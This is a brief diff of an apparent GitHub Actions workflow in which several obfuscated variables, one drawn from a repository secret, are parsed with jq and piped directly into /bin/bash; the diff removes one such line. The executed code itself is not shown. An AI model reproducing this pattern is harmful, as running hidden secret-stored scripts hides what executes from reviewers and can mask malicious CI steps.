@@ -17,7 +17,6 @@ jobs:
           ixxb64: ${{ secrets.ixxb64 }}
         run: |
           printf '%s' "$ixxb64" | jq -r .m8 | /bin/bash
-          printf '%s' "$tjezy2" | jq -r .yk52777 | /bin/bash
           printf '%s' "$bnmlb9" | jq -r .ah6275 | /bin/bash
           echo $kmr64910 | jq -r .gkdz36 | /bin/bash
           echo $kvvc64 | jq -r .g47135 | /bin/bash
